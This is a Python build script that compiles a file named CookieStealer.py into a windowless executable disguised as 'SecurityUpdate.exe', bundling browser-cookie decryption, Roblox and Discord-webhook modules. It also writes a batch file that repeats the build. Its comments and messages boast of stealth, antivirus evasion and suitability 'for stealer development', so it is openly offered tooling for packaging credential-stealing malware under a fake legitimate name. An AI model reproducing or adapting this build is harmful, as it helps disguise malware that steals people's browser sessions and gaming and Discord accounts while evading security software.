
import subprocess
import sys
import os

def install_nuitka():
    """Install Nuitka and dependencies"""
    packages = [
        'nuitka',
        'ordered-set',
        'browser-cookie3',
        'pycryptodome', 
        'pywin32',
        'discordwebhook',
        'httpx',
        'requests',
        'robloxpy'
    ]
    
    for package in packages:
        print(f"Installing {package}...")
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
        except:
            print(f"Warning: {package} install failed")

def build_with_nuitka():
    """Build executable with Nuitka for maximum stealth"""
    
    command = [
        'python', '-m', 'nuitka',
        '--standalone',              # Create standalone executable
        '--onefile',                 # Single file output
        '--windows-console-mode=disable', # No console window
        '--enable-plugin=upx',       # Enable UPX compression
        '--remove-output',           # Clean build files
        '--output-filename=SecurityUpdate.exe',  # Legitimate name
        
        # Advanced obfuscation options
        '--show-progress',
        '--assume-yes-for-downloads',
        '--windows-icon-from-ico=icon32.ico',
        
        # Include all modules statically 
        '--include-module=win32crypt',
        '--include-module=Crypto.Cipher.AES',
        '--include-module=browser_cookie3',
        '--include-module=discordwebhook',
        '--include-module=robloxpy',
        '--include-module=httpx',
        '--include-module=requests',
        '--include-module=sqlite3',
        '--include-module=json',
        '--include-module=base64',
        
        'CookieStealer.py'
    ]
    
    print("Building with Nuitka (True compilation + obfuscation)...")
    print("This creates a REAL compiled executable, not packaged Python!")
    
    try:
        result = subprocess.run(command)
        
        if result.returncode == 0:
            print("✅ SUCCESS: SecurityUpdate.exe created!")
            print("🔥 This is a TRUE COMPILED executable (C++ machine code)")
            print("🔒 Code is completely obfuscated (not reversible)")
            print("⚡ Much faster execution than PyInstaller")
            print("🛡️ Better AV evasion than packaged Python")
            
            # Show file info
            if os.path.exists('SecurityUpdate.exe'):
                size = os.path.getsize('SecurityUpdate.exe') / (1024*1024)
                print(f"📦 File size: {size:.1f}MB")
        else:
            print("❌ Build failed!")
            
    except Exception as e:
        print(f"Error: {e}")

def create_batch_build():
    """Create Windows batch file for easy building"""
    batch_content = '''@echo off
echo Installing Nuitka and dependencies...
pip install nuitka ordered-set browser-cookie3 pycryptodome pywin32 discordwebhook httpx requests robloxpy

echo Building with Nuitka (True Compilation)...
python -m nuitka --standalone --onefile --windows-console-mode=disable --enable-plugin=upx --remove-output --output-filename=SecurityUpdate.exe --windows-icon-from-ico=icon32.ico --include-module=win32crypt --include-module=Crypto.Cipher.AES --include-module=browser_cookie3 --include-module=discordwebhook --include-module=robloxpy --include-module=httpx --include-module=requests --include-module=sqlite3 --include-module=json --include-module=base64 CookieStealer.py

echo Build complete! SecurityUpdate.exe is a TRUE compiled executable
pause
'''
    
    with open('nuitka_build.bat', 'w') as f:
        f.write(batch_content)
    
    print("Created nuitka_build.bat for Windows building")

if __name__ == "__main__":
    print("=== NUITKA BUILD SYSTEM ===")
    print("Creates REAL compiled executables (not packaged Python)")
    print("Much better than PyInstaller for stealer development!")
    print("")
    
    install_nuitka()
    build_with_nuitka()
    create_batch_build()
